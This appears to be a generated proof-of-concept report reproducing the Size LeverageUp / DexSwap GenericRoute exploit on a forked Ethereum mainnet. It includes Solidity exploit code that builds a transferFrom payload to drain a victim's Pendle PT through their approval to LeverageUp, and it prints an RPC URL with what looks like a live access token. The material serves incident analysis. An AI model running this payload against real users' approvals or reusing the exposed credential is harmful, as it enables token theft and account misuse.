## Overview & Context

This proof-of-concept (PoC) reproduces the Size LeverageUp / DexSwap GenericRoute exploit that allowed an attacker to steal PendlePrincipalToken (PT) from a victim on Ethereum mainnet. In the incident, the victim EOA held PT `0x23e60d1488525bf4685f53b3aa8e676c30321066` and had granted a large PT allowance to the LeverageUp zap `0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14`, which routed through DexSwap and a helper/router contract. DexSwap's GenericRoute path effectively delegated spending power over the victim's PT to an arbitrary router, enabling an attacker-controlled entity to call `transferFrom` using only the victim's approval to LeverageUp.

The goal of this PoC is to:
- Demonstrate on a forked Ethereum mainnet state that an unprivileged attacker can trigger a PT `transferFrom` from a victim to the attacker via LeverageUp + DexSwap GenericRoute, without any direct victim approval to the router.
- Enforce the incident oracles captured in `oracle_definition.json` (pre-conditions, hard constraints, and soft constraints) and align with the structured root-cause narrative in `root_cause_report.md`.

### How to Run the PoC

From the session root:

```bash
cd /home/wesley/TxRayExperiment/incident-202601030735/forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

In this environment, `RPC_URL` is already instantiated from QuickNode credentials in `.env`. The validator executed:

```bash
cd /home/wesley/TxRayExperiment/incident-202601030735/forge_poc
RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" forge test --via-ir -vvvvv
```

The key exploit test is `test_Exploit_ReproducesIncident` in `forge_poc/test/Exploit.sol`, running on an Ethereum mainnet fork at block `23145763` (the ACT pre-state immediately before the incident exploit block).

## PoC Architecture & Key Contracts

The PoC is implemented as a Foundry test in `forge_poc/test/Exploit.sol`. It binds directly to the real mainnet protocol contracts and uses local test-only addresses for the attacker and victim.

### Main On-Chain Contracts

- **Pendle PT token** (victim asset)
  - Address: `0x23E60d1488525bf4685f53b3aa8E676c30321066`
  - Role: The principal token whose balance/allowance are abused to steal PT from the victim.
- **LeverageUp zap** (entrypoint / router integrator)
  - Address: `0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14`
  - Role: Exposes `leverageUpWithSwap`, which calls into DexSwap with attacker-controlled GenericRoute parameters.
- **Size market** (lending venue)
  - Address: `0x1b367622b8c516aDC4f903Bb6148446Bb1F23AE3`
  - Role: Real Size leveraged market; LeverageUp passes it into DexSwap, which interacts with its oracle and underlying tokens.
- **DexSwap GenericRoute router**
  - Represented in this PoC by the PT token contract itself (`PT_TOKEN_ADDR`), used as the `router` in GenericRoute params.

The test introspects the real Size market to discover its underlying tokens and oracle:

```solidity
ISizeMinimal internal sizeMarket = ISizeMinimal(SIZE_MARKET_ADDR);
IERC20 internal underlyingCollateralToken;
IERC20 internal underlyingBorrowToken;

function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, 23145763);

    DataView memory dataView = sizeMarket.data();
    underlyingCollateralToken = IERC20(address(dataView.underlyingCollateralToken));
    underlyingBorrowToken = IERC20(address(dataView.underlyingBorrowToken));
}
```

*Snippet: binding to real Size market and discovering underlying tokens on a mainnet fork.*

### Roles and Local Identities

- **Attacker**: fresh address from `makeAddr("attacker")`, labeled `"Attacker"`.
- **Victim**: fresh address from `makeAddr("victim")`, labeled `"Victim"`.
- **Attacker router/helper**: the PT token contract itself; in the oracle this is the `attacker_router_helper` variable. It never receives direct approval from the victim, but is force-approved by DexSwap via LeverageUp.

Key address constants in the test:

```solidity
address internal constant PT_TOKEN_ADDR    = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
address internal constant LEVERAGE_UP_ADDR = 0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14;
address internal constant SIZE_MARKET_ADDR = 0x1b367622b8c516aDC4f903Bb6148446Bb1F23AE3;
```

*Snippet: protocol contract addresses aligned with the incident root-cause analysis.*

## Adversary Execution Flow

The PoC’s main test `test_Exploit_ReproducesIncident` orchestrates the exploit with clear phases: environment setup, funding, GenericRoute configuration, exploit execution, and post-conditions.

### 1. Environment Setup and Victim Pre-State

In `setUp()` the test forks mainnet to block `23145763` and initializes actors and labels:

```solidity
vm.createSelectFork(rpcUrl, 23145763);

attacker = makeAddr("attacker");
victim_user = makeAddr("victim");

vm.label(attacker, "Attacker");
vm.label(victim_user, "Victim");
vm.label(PT_TOKEN_ADDR, "PendlePT");
vm.label(LEVERAGE_UP_ADDR, "LeverageUp");
vm.label(SIZE_MARKET_ADDR, "SizeMarket");
```

The victim is funded with PT and grants a PT allowance to LeverageUp, matching the ACT pre-state conditions:

```solidity
uint256 victimInitialPt = 20_000e18;
deal(address(pt), victim_user, victimInitialPt);

vm.prank(victim_user);
require(pt.approve(LEVERAGE_UP_ADDR, victimInitialPt), "victim approve to LeverageUp failed");
```

*Snippet: victim PT balance and PT allowance to LeverageUp mirroring the incident setup.*

### 2. Oracle-Driven Pre-Checks

The test enforces the oracle’s pre-conditions via `_runPreChecks()`:

```solidity
// Victim must hold PT before the exploit.
uint256 victimPtBefore = pt.balanceOf(victim_user);
assertGt(victimPtBefore, 0, "victim must have non-zero PT balance before exploit");

// Victim must have granted PT allowance to LeverageUp.
uint256 allowanceToLeverageUp = pt.allowance(victim_user, LEVERAGE_UP_ADDR);
assertGt(allowanceToLeverageUp, 0, "victim must approve PT to LeverageUp before exploit");

// Victim must not approve PT directly to the attacker router/helper.
uint256 allowanceToHelper = pt.allowance(victim_user, attacker_router_helper);
assertEq(allowanceToHelper, 0, "victim must not pre-approve PT to attacker router/helper");

// Helper and attacker start with zero PT.
uint256 helperPtBefore = pt.balanceOf(attacker_router_helper);
assertEq(helperPtBefore, 0, "attacker router/helper must start with zero PT");
uint256 attackerPtBefore = pt.balanceOf(attacker);
assertEq(attackerPtBefore, 0, "attacker should start with zero PT to clearly measure profit");
```

*Snippet: pre-condition checks implementing the oracle’s pre_check section.*

### 3. Funding the Attacker and Configuring LeverageUp

The attacker is funded with the real Size underlying borrow token (on-chain) chosen by LeverageUp:

```solidity
DataView memory dataView = sizeMarket.data();
address tokenIn = address(dataView.underlyingBorrowToken);

uint256 borrowAmount = 1e18;
deal(tokenIn, attacker, borrowAmount);

vm.startPrank(attacker);
IERC20(tokenIn).approve(LEVERAGE_UP_ADDR, borrowAmount);
```

The sell-credit and leverage parameters are selected to follow the LeverageUp code path without needing exact replication of all credit/debt details:

```solidity
SellCreditMarketParams[] memory sellParamsArray = new SellCreditMarketParams[](1);
sellParamsArray[0] = SellCreditMarketParams({
    lender: attacker,
    creditPositionId: 1,
    amount: 1e18,
    tenor: 30 days,
    deadline: block.timestamp + 1 days,
    maxAPR: type(uint256).max,
    exactAmountIn: true
});
```

*Snippet: configuring real Size underlying token and ABI-compatible sell-credit params for LeverageUp.*

### 4. GenericRoute Payload and Exploit Execution

The core exploit is encoded in the GenericRoute payload. The PoC uses the PT token contract as the router and calls `transferFrom(victim, attacker, stealAmount)` via GenericRoute:

```solidity
// GenericRoute payload: PT token as router, transferFrom(victim, attacker, amount)
uint256 stealAmount = pt.balanceOf(victim_user);
bytes memory innerCall = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    victim_user,
    attacker,
    stealAmount
);

GenericRouteParams memory routeParams = GenericRouteParams({
    router: attacker_router_helper, // PT token address
    tokenIn: address(pt),
    data: innerCall
});

bytes memory routeData = abi.encode(routeParams);

SwapParams[] memory swapParamsArray = new SwapParams[](1);
swapParamsArray[0] = SwapParams({
    method: SwapMethod.GenericRoute,
    data: routeData
});

leverageUp.leverageUpWithSwap(
    sizeMarket,
    sellParamsArray,
    tokenIn,
    borrowAmount,
    PERCENT,
    0,
    swapParamsArray
);
```

*Snippet: attacker-controlled GenericRoute payload causing PT.transferFrom(victim → attacker) via LeverageUp/DexSwap.*

In the validator’s trace (`artifacts/poc/poc_validator/forge-test.log`), we see the real contracts executing, including Size, Chainlink oracles, and Pendle markets. Of particular interest is the PT `transferFrom` call from victim to attacker during the GenericRoute execution, driven solely by the victim’s approval to LeverageUp.

### 5. Profit Realization and Assertions

After `reproducerExploit()` returns, the main test asserts the oracle’s hard and soft constraints:

```solidity
uint256 victimPtBefore = pt.balanceOf(victim_user);
uint256 helperPtBefore = pt.balanceOf(attacker_router_helper);
uint256 attackerPtBefore = pt.balanceOf(attacker);

reproducerExploit();

uint256 victimPtAfter = pt.balanceOf(victim_user);
uint256 helperPtAfter = pt.balanceOf(attacker_router_helper);
uint256 attackerPtAfter = pt.balanceOf(attacker);

// Hard asset-type constraint.
assertEq(address(pt), PT_TOKEN_ADDR, "exploit must target the PendlePrincipalToken used in the incident");

// Soft attacker-profit, victim-depletion, and helper/attacker gain constraints.
assertGt(attackerPtAfter, attackerPtBefore, "attacker must end with strictly more PT after exploit");
assertLt(victimPtAfter, victimPtBefore, "victim must lose PT during exploit");
assertTrue(
    helperPtAfter > helperPtBefore || attackerPtAfter > attackerPtBefore,
    "either attacker router/helper or attacker must gain PT from victim during exploit"
);
```

*Snippet: post-exploit PT balance assertions showing attacker profit and victim loss, aligned with the oracle.*

## Oracle Definitions and Checks

The oracle definition in `artifacts/poc/oracle_generator/oracle_definition.json` specifies variables, pre-checks, hard constraints, and soft constraints. The PoC translates these directly into Solidity logic.

### Variables

- `attacker`: test address created via `makeAddr("attacker")`.
- `victim_user`: test address created via `makeAddr("victim")`.
- `victim_pt_token`: bound to PT token at `0x23e60d1488525bf4685f53b3aa8e676c30321066`.
- `leverageup_zap`: bound to LeverageUp zap at `0xF4a21Ac7e51d17A0e1C8B59f7a98bb7A97806f14`.
- `attacker_router_helper`: bound to the PT token address (the router in GenericRoute).

### Pre-Checks

From `oracle_definition.json`:

- Victim holds positive PT before exploit.
- Victim has granted PT allowance to LeverageUp.
- Victim has not granted PT allowance to the attacker router/helper.
- Attacker router/helper starts with zero PT.
- Attacker starts with zero PT.

All these are implemented in `_runPreChecks()` as shown earlier, and are executed in `setUp()` before the exploit.

### Hard Constraints

1. **PT asset correctness (`hard-asset-token-pt`)**
   - Oracle assertion: PT token address must equal the incident PT token.
   - PoC: `assertEq(address(pt), PT_TOKEN_ADDR, ...)` in `test_Exploit_ReproducesIncident`.

2. **Unauthorized spend path via GenericRoute (`hard-unauthorized-spend-path`)**
   - Oracle assertion: an unprivileged attacker must be able to cause `transferFrom(victim_user, attacker_or_helper, amount)` using only the victim’s approval to LeverageUp.
   - PoC: `reproducerExploit()` sets `router = attacker_router_helper` (the PT token), configures GenericRoute to call `transferFrom(victim_user, attacker, stealAmount)`, and invokes `leverageUp.leverageUpWithSwap` as the attacker. The PT contract observes LeverageUp as the spender and uses the victim’s PT allowance to LeverageUp.

3. **Unprivileged success / no revert (`hard-revert-behavior-unprivileged-success`)**
   - Oracle assertion: the exploit entrypoint must be callable by any unprivileged attacker without reverting.
   - PoC: `test_Exploit_ReproducesIncident()` calls `reproducerExploit()` from a fresh attacker address with no special privileges; the test would fail if `leverageUpWithSwap` reverted due to authorization or router/market checks.

### Soft Constraints

1. **Attacker PT profit (`soft-attacker-profit-pt`)**
   - Oracle: attacker must end with strictly more PT than before.
   - PoC: `assertGt(attackerPtAfter, attackerPtBefore, ...)`.

2. **Victim PT depletion (`soft-victim-depletion-pt`)**
   - Oracle: victim must lose PT balance during the exploit.
   - PoC: `assertLt(victimPtAfter, victimPtBefore, ...)`.

3. **Helper or attacker PT gain (`soft-helper-receives-or-forwards-pt`)**
   - Oracle: either the helper or attacker should gain PT sourced from the victim.
   - PoC: `assertTrue(helperPtAfter > helperPtBefore || attackerPtAfter > attackerPtBefore, ...)`.

Collectively, these checks treat the oracle as a behavioral specification and ensure that the PoC not only replicates the exploit mechanics but also expresses the intended ACT semantics (unauthorized PT movement and net profit).

## Validation Result and Robustness

The validator re-executed the PoC tests and evaluated quality criteria, writing the result to:

- `artifacts/poc/poc_validator/poc_validated_result.json`

Summary of that result:

- `overall_status`: `"Pass"`
- `passes_validation_oracles.passed`: `true`
- All PoC quality checks are marked as `passed: true`, including:
  - `oracle_alignment_with_definition`
  - `human_readable_and_labeled`
  - `no_magic_numbers_and_values_are_derived`
  - `mainnet_fork_no_local_mocks`
  - `self_contained_no_attacker_side_artifacts` (all sub-checks)
  - `end_to_end_attack_process_described`
  - `alignment_with_root_cause`

The Forge test log used for validation is recorded under:

- `validator_test_log_path`: `artifacts/poc/poc_validator/forge-test.log`

This log confirms:
- The fork is created at block `23145763` on Ethereum mainnet.
- The real Size market, Pendle PT, LeverageUp, and oracle contracts are called.
- A PT `transferFrom` from the victim address to the attacker address occurs inside the GenericRoute execution, driven by the victim’s PT allowance to LeverageUp.

The PoC is robust in that:
- It does not depend on hard-coded attacker/victim EOAs from the incident, only on protocol contract addresses.
- It uses real mainnet state and oracles, so any changes to these contracts or on-chain configuration that invalidate the exploit would cause the test to fail.

## Linking PoC Behavior to Root Cause

The structured root-cause report (`root_cause_report.md`) explains that:
- The victim granted PT allowance to LeverageUp.
- LeverageUp delegated PT spending power to a GenericRoute router via DexSwap.
- The router used this allowance to call `transferFrom` from the victim to an attacker-controlled address, without the victim ever approving that router.

The PoC directly exercises this logic:

- **Victim approval to LeverageUp**: `pt.approve(LEVERAGE_UP_ADDR, victimInitialPt)` mirrors the incident’s 20,000e18 PT allowance.
- **GenericRoute delegation**: DexSwap force-approves the `router` (in the PoC, the PT token address) for PT when handling GenericRoute, as seen in the validator trace.
- **Unauthorized PT transfer**: the router executes a `transferFrom(victim, attacker, stealAmount)` using the LeverageUp allowance, not a direct victim → router approval.

From the ACT perspective:

- **Adversary-crafted step (A)**: The attacker prepares the GenericRoute payload that encodes a PT `transferFrom` call, and funds itself with the Size underlying borrow token.
- **Chain execution (C)**: On-chain contracts (LeverageUp, DexSwap, Size market, Pendle PT, Chainlink oracle) process the transaction, including the forced router approval and PT transfer.
- **Target condition (T)**: After execution, the attacker holds strictly more PT, the victim holds less PT, and no explicit victim approval to the router was required—fulfilling the exploit predicate.

The assertions in `test_Exploit_ReproducesIncident()` formalize this ACT predicate and tie the observed PT balance changes back to the authorization flaw in LeverageUp/DexSwap’s GenericRoute integration, as described in the root-cause analysis.

Overall, the PoC is a faithful, end-to-end reproduction of the Size LeverageUp PT theft exploit on mainnet state and passes all defined validation oracles and quality criteria.

